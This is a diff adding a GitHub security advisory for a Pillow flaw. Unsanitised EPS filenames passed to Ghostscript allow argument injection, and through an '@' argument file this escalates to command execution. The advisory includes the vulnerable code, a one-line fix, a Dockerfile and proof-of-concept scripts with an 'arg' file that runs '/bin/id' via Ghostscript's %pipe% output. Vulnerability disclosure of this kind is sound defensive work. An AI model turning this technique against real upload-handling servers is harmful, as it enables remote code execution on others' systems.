@@ -1,0 +1,137 @@
+{
+  "id": "GHSA-w889-685w-c8fh",
+  "modified": "2026-10-21T20:15:04.208518478Z",
+  "published": "2026-10-21T19:58:44Z",
+  "aliases": [
+    "CVE-2026-112900"
+  ],
+  "summary": "Pillow: Argument Injection in Ghostscript call, potentially leading into RCE",
+  "details": "### Summary\n`PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f \u003cinfile\u003e`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n#### Type\nCWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)\n\n#### Vulnerable Codes\n\n```python\ninfile_temp = None\nif hasattr(fp, \"name\") and os.path.exists(fp.name):\n    infile = fp.name                      # user-controlled path used as-is, without validation\nelse:\n    in_fd, infile_temp = tempfile.mkstemp()\n    os.close(in_fd)\n    infile = infile_temp\n    # ... (copy fp into a temporary file)\n\n# Build Ghostscript command\ncommand = [\n    gs_binary,\n    \"-q\",\n    f\"-g{width:d}x{height:d}\",\n    f\"-r{res_x:f}x{res_y:f}\",\n    \"-dBATCH\",\n    \"-dNOPAUSE\",\n    \"-dSAFER\",                            # default sandbox — does NOT stop this injection\n    f\"-sDEVICE={device}\",\n    f\"-sOutputFile={outfile}\",\n    \"-c\",\n    f\"{-bbox[0]} {-bbox[1]} translate\",\n    \"-f\",\n    infile,                               # injected here: inserted into argv with no check for\n                                          # option prefixes (-, --) or Ghostscript's @-file token\n                                          # =\u003e argument injection (CWE-88)\n    \"-c\",\n    \"showpage\",\n]\n# ...\nsubprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript\n```\n\n#### Root cause. \n\nWhen rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f \u003cinfile\u003e position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.\n\n#### Affected\n- Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).\n- Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `\"-f\", infile`.\n\n#### Suggested fix\nNormalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):\n```python\n    if hasattr(fp, \"name\") and os.path.exists(fp.name):\n        infile = os.path.abspath(fp.name)   # was: infile = fp.name\n```\n`os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.\n\n### PoC\ndockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.\n```\nFROM ubuntu:24.04\n\nRUN apt update\nRUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates\nRUN rm -rf /var/lib/apt/lists/*\nRUN python3 -m venv /venv \u0026\u0026 /venv/bin/pip install --upgrade pip Pillow==12.3.0\nENV PATH=/venv/bin:$PATH\nWORKDIR /poc\nCOPY poc.py .\nCOPY poc-rce.py .\nCOPY arg .\n\nCMD [\"python3\", \"poc.py\"]\n```\npoc.py\n```\nimport os\nfrom PIL import Image\n\n############################################################################################\n# Attacker controlled file\n############################################################################################\n\nEPS = b\"%!PS-Adobe-3.0 EPSF-3.0\\n%%BoundingBox: 0 0 100 100\\n%%EndComments\\nshowpage\\n\"\n\nname = \"-h\"\nwith open(name, \"wb\") as f:\n    f.write(EPS)\n\n############################################################################################\n\nprint(f\"[*] Pillow opens a file whose name is {name!r}\")\nim = Image.open(name)\nprint(f\"[*] call `load()`; this paths calls `gs` command with '-f {name}'\")\ntry:\n    im.load()\nexcept Exception as e:\n    print(f\"[*] load() raised: {type(e).__name__}: {e}\")\n\nprint(\"CWE-88: argument injection; Pillow code doesn't validate argument name\")\nprint(\"        This poc.py shows the vulnerability clearly.\")\nprint(\"        If Pillow checks the name of file before it uses, It won't display `help`\")\n```\npoc-rce.py\n```\nimport os\nfrom PIL import Image\n\n############################################################################################\n# Attacker controlled file\n############################################################################################\n\nEPS = b\"%!PS-Adobe-3.0 EPSF-3.0\\n%%BoundingBox: 0 0 100 100\\n%%EndComments\\nshowpage\\n\"\n\n# To chain this vulnerability into critical RCE, We need another arbitrary text file\n# In this script, it is `arg`.\nname = \"@arg\"\nwith open(name, \"wb\") as f:\n    f.write(EPS)\n\n############################################################################################\n\nprint(f\"[*] Pillow opens a file whose name is {name!r}\")\nim = Image.open(name)\nprint(f\"[*] call `load()`; this paths calls `gs` command with '-f {name}'\")\nprint(f\"[*] and this leads to arbitrary command injection.\")\nprint(f\"*********************************************\")\ntry:\n    im.load()\nexcept Exception as e:\n    print(f\"*********************************************\")\n    print(f\"[*] load() raised: {type(e).__name__}: {e}\")\n\nprint(\"\")\nprint(\"CWE-78: OS Command Injection;\")\nprint(\"CWE-88: Argument Injection  ; Pillow code doesn't validate argument name\")\nprint(\"        This poc.py shows the vulnerability clearly.\")\nprint(\"        If Pillow checks the name of file before it uses, It won't call `id`\")\n```\narg\n```\n-sOutputFile=%pipe%/bin/id\n-c\n1\ndict\ndup\n/OutputFile\n(%pipe%/bin/id)\nput\nsetpagedevice\n```\n\n### Impact\n**Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.\n\n**Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@\u003cpath\u003e` causes Ghostscript to read additional command-line arguments from `\u003cpath\u003e`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).\n\nApplies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)\n\n### Why this is a Pillow bug (not the documented \"block untrusted EPS\" risk)\nThis is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.\nBecause Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.\n\n### Author\nChanu Kang (from CysecLab at KAIST) @HLe4s",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.6.0"
+            },
+            {
+              "fixed": "13.0.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "12.3.0",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-w889-685w-c8fh/GHSA-w889-685w-c8fh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-w889-685w-c8fh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112900"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/a2c363141da31a265dd536c945677db4b64f3ec9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/13.0.0"
+    }
+  ]
+}
